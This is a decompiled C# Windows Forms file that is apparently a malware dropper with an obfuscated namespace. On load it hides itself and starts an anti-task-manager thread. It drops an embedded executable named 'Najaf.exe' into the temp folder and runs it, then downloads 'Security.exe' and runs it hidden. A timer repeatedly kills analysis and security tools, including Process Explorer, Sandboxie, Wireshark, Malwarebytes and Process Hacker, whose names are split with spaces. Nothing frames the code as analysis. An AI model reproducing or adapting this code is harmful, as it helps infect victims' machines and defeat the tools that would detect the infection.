using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using LLLLLDDBHFBBWHWVHE.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace LLLLLDDBHFBBWHWVHE;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	internal IContainer icontainer_0;

	internal Timer timer_0;

	internal AntiTaskManager antiTaskManager_0;

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		AntiTaskManager antiTaskManager = (antiTaskManager_0 = new AntiTaskManager());
		InitializeComponent();
	}

	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		IContainer container = (icontainer_0 = new Container());
		vmethod_1(new Timer(icontainer_0));
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(284, 262);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void vmethod_1(Timer timer_1)
	{
		EventHandler eventHandler = method_0;
		if (timer_0 != null)
		{
			timer_0.remove_Tick(eventHandler);
		}
		Timer val = (timer_0 = timer_1);
		if (timer_0 != null)
		{
			timer_0.add_Tick(eventHandler);
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		ProjectData.EndApp();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		Thread thread = default(Thread);
		string temp = default(string);
		string text = default(string);
		WebClient webClient = default(WebClient);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					((Control)this).Hide();
					goto IL_0008;
				case 273:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0000;
							case 1:
								break;
							case 0:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0032;
						case 6:
							goto IL_003b;
						case 7:
							goto IL_0044;
						case 8:
							goto IL_004c;
						case 9:
							goto IL_0054;
						case 10:
							goto IL_006c;
						case 11:
							goto IL_007c;
						case 12:
							goto IL_008b;
						case 13:
							goto IL_0096;
						case 14:
							goto IL_00a4;
						case 15:
							goto IL_00ae;
						case 16:
							goto IL_00d1;
						case 17:
							goto IL_00f1;
						case 18:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 0:
							goto end_IL_0000;
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00f1:
					num = 17;
					Thread.Sleep(10000);
					break;
					IL_00d1:
					num = 16;
					Interaction.Shell(Interaction.Environ("tmp") + "/Security.exe", (AppWinStyle)2, false, -1);
					goto IL_00f1;
					IL_0008:
					num = 2;
					Control.set_CheckForIllegalCrossThreadCalls(false);
					goto IL_0010;
					IL_0010:
					num = 3;
					thread = new Thread(antiTaskManager_0.protect);
					goto IL_002a;
					IL_002a:
					num = 4;
					thread.Start();
					goto IL_0032;
					IL_0032:
					num = 5;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_003b;
					IL_003b:
					num = 6;
					((Form)this).set_ShowIcon(false);
					goto IL_0044;
					IL_0044:
					num = 7;
					((Control)this).Hide();
					goto IL_004c;
					IL_004c:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0054;
					IL_0054:
					num = 9;
					temp = ((ServerComputer)MyProject.MyComputer_0).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_006c;
					IL_006c:
					num = 10;
					text = temp + "Najaf.exe";
					goto IL_007c;
					IL_007c:
					num = 11;
					File.WriteAllBytes(text, Class4.smethod_0());
					goto IL_008b;
					IL_008b:
					num = 12;
					Process.Start(text);
					goto IL_0096;
					IL_0096:
					num = 13;
					vmethod_0().Start();
					goto IL_00a4;
					IL_00a4:
					num = 14;
					webClient = new WebClient();
					goto IL_00ae;
					IL_00ae:
					num = 15;
					webClient.DownloadFile("xx", Interaction.Environ("tmp") + "/Security.exe");
					goto IL_00d1;
					end_IL_0000_2:
					break;
				}
				num = 18;
				((Form)this).Close();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 273;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_0(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process process = default(Process);
		int num5 = default(int);
		Process[] processesByName = default(Process[]);
		Process[] array = default(Process[]);
		int num6 = default(int);
		Process process2 = default(Process);
		Process[] processesByName2 = default(Process[]);
		Process[] array2 = default(Process[]);
		int num7 = default(int);
		Process process3 = default(Process);
		Process[] processesByName3 = default(Process[]);
		Process[] array3 = default(Process[]);
		int num8 = default(int);
		Process process4 = default(Process);
		Process[] processesByName4 = default(Process[]);
		Process[] array4 = default(Process[]);
		Process[] processesByName5 = default(Process[]);
		Process[] array5 = default(Process[]);
		int num9 = default(int);
		Process process5 = default(Process);
		Process[] processesByName6 = default(Process[]);
		Process[] array6 = default(Process[]);
		int num10 = default(int);
		Process process6 = default(Process);
		Process[] processesByName7 = default(Process[]);
		Process[] array7 = default(Process[]);
		int num11 = default(int);
		Process process7 = default(Process);
		Process[] processesByName8 = default(Process[]);
		Process[] array8 = default(Process[]);
		int num12 = default(int);
		Process process8 = default(Process);
		Process[] processesByName9 = default(Process[]);
		Process[] array9 = default(Process[]);
		int num13 = default(int);
		Process process9 = default(Process);
		Process[] processesByName10 = default(Process[]);
		Process[] array10 = default(Process[]);
		int num14 = default(int);
		Process process10 = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0008;
					case 636:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								default:
									goto end_IL_0000;
								case 1:
									break;
								case 0:
									goto end_IL_0000;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
								goto IL_0015;
							case 4:
								goto IL_0024;
							case 5:
								goto IL_0033;
							case 6:
								goto IL_003e;
							case 7:
								goto IL_004c;
							case 8:
								goto IL_005e;
							case 9:
								goto IL_006d;
							case 10:
								goto IL_007a;
							case 11:
								goto IL_0089;
							case 12:
								goto IL_009c;
							case 13:
								goto IL_00ac;
							case 14:
								goto IL_00b9;
							case 15:
								goto IL_00c8;
							case 16:
								goto IL_00db;
							case 17:
								goto IL_00eb;
							case 18:
								goto IL_00f8;
							case 19:
								goto IL_0107;
							case 20:
								goto IL_011a;
							case 21:
								goto IL_012a;
							case 22:
								goto IL_0137;
							case 23:
								goto IL_0146;
							case 24:
								goto IL_0159;
							case 25:
								goto IL_0169;
							case 26:
								goto IL_0176;
							case 27:
								goto IL_0185;
							case 28:
								goto IL_0198;
							case 29:
								goto IL_01a8;
							case 30:
								goto IL_01b5;
							case 31:
								goto IL_01c4;
							case 32:
								goto IL_01d7;
							case 33:
								goto IL_01e7;
							case 34:
								goto IL_01f4;
							case 35:
								goto IL_0203;
							case 36:
								goto IL_0216;
							case 37:
								goto IL_0226;
							case 38:
								goto IL_0233;
							case 39:
								goto IL_0242;
							case 40:
								goto IL_0255;
							case 41:
								goto IL_0265;
							default:
								goto end_IL_0000;
							case 0:
								goto end_IL_0000;
							case 42:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_00db:
						num = 16;
						process.Kill();
						num5++;
						goto IL_00eb;
						IL_00ac:
						num = 13;
						goto IL_00af;
						IL_0008:
						num = 2;
						processesByName = Process.GetProcessesByName("pro cexp");
						goto IL_0015;
						IL_0015:
						num = 3;
						array = processesByName;
						num6 = 0;
						goto IL_0035;
						IL_0035:
						if (num6 < array.Length)
						{
							process2 = array[num6];
							goto IL_0024;
						}
						goto IL_003e;
						IL_003e:
						num = 6;
						processesByName2 = Process.GetProcessesByName("Sbi eCtrl");
						goto IL_004c;
						IL_004c:
						num = 7;
						array2 = processesByName2;
						num7 = 0;
						goto IL_0070;
						IL_0070:
						if (num7 < array2.Length)
						{
							process3 = array2[num7];
							goto IL_005e;
						}
						goto IL_007a;
						IL_007a:
						num = 10;
						processesByName3 = Process.GetProcessesByName("Spy TheSpy");
						goto IL_0089;
						IL_0089:
						num = 11;
						array3 = processesByName3;
						num8 = 0;
						goto IL_00af;
						IL_00af:
						if (num8 < array3.Length)
						{
							process4 = array3[num8];
							goto IL_009c;
						}
						goto IL_00b9;
						IL_00b9:
						num = 14;
						processesByName4 = Process.GetProcessesByName("Spe edGear");
						goto IL_00c8;
						IL_00c8:
						num = 15;
						array4 = processesByName4;
						num5 = 0;
						goto IL_00ee;
						IL_00ee:
						if (num5 < array4.Length)
						{
							process = array4[num5];
							goto IL_00db;
						}
						goto IL_00f8;
						IL_00f8:
						num = 18;
						processesByName5 = Process.GetProcessesByName("wir eshark");
						goto IL_0107;
						IL_0107:
						num = 19;
						array5 = processesByName5;
						num9 = 0;
						goto IL_012d;
						IL_012d:
						if (num9 < array5.Length)
						{
							process5 = array5[num9];
							goto IL_011a;
						}
						goto IL_0137;
						IL_0137:
						num = 22;
						processesByName6 = Process.GetProcessesByName("mba m");
						goto IL_0146;
						IL_0146:
						num = 23;
						array6 = processesByName6;
						num10 = 0;
						goto IL_016c;
						IL_016c:
						if (num10 < array6.Length)
						{
							process6 = array6[num10];
							goto IL_0159;
						}
						goto IL_0176;
						IL_0176:
						num = 26;
						processesByName7 = Process.GetProcessesByName("apa teDNS");
						goto IL_0185;
						IL_0185:
						num = 27;
						array7 = processesByName7;
						num11 = 0;
						goto IL_01ab;
						IL_01ab:
						if (num11 < array7.Length)
						{
							process7 = array7[num11];
							goto IL_0198;
						}
						goto IL_01b5;
						IL_01b5:
						num = 30;
						processesByName8 = Process.GetProcessesByName("IPB locker");
						goto IL_01c4;
						IL_01c4:
						num = 31;
						array8 = processesByName8;
						num12 = 0;
						goto IL_01ea;
						IL_01ea:
						if (num12 < array8.Length)
						{
							process8 = array8[num12];
							goto IL_01d7;
						}
						goto IL_01f4;
						IL_01f4:
						num = 34;
						processesByName9 = Process.GetProcessesByName("cpo rts");
						goto IL_0203;
						IL_0203:
						num = 35;
						array9 = processesByName9;
						num13 = 0;
						goto IL_0229;
						IL_0229:
						if (num13 < array9.Length)
						{
							process9 = array9[num13];
							goto IL_0216;
						}
						goto IL_0233;
						IL_0233:
						num = 38;
						processesByName10 = Process.GetProcessesByName("Pro cessHacker");
						goto IL_0242;
						IL_0242:
						num = 39;
						array10 = processesByName10;
						num14 = 0;
						goto IL_0268;
						IL_0268:
						if (num14 < array10.Length)
						{
							process10 = array10[num14];
							goto IL_0255;
						}
						goto end_IL_0000_2;
						IL_0033:
						num = 5;
						goto IL_0035;
						IL_0255:
						num = 40;
						process10.Kill();
						num14++;
						goto IL_0265;
						IL_0265:
						num = 41;
						goto IL_0268;
						IL_0024:
						num = 4;
						process2.Kill();
						num6++;
						goto IL_0033;
						IL_0216:
						num = 36;
						process9.Kill();
						num13++;
						goto IL_0226;
						IL_0226:
						num = 37;
						goto IL_0229;
						IL_00eb:
						num = 17;
						goto IL_00ee;
						IL_01d7:
						num = 32;
						process8.Kill();
						num12++;
						goto IL_01e7;
						IL_01e7:
						num = 33;
						goto IL_01ea;
						IL_006d:
						num = 9;
						goto IL_0070;
						IL_0198:
						num = 28;
						process7.Kill();
						num11++;
						goto IL_01a8;
						IL_01a8:
						num = 29;
						goto IL_01ab;
						IL_005e:
						num = 8;
						process3.Kill();
						num7++;
						goto IL_006d;
						IL_0159:
						num = 24;
						process6.Kill();
						num10++;
						goto IL_0169;
						IL_0169:
						num = 25;
						goto IL_016c;
						IL_009c:
						num = 12;
						process4.Kill();
						num8++;
						goto IL_00ac;
						IL_011a:
						num = 20;
						process5.Kill();
						num9++;
						goto IL_012a;
						IL_012a:
						num = 21;
						goto IL_012d;
						end_IL_0000:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 636;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
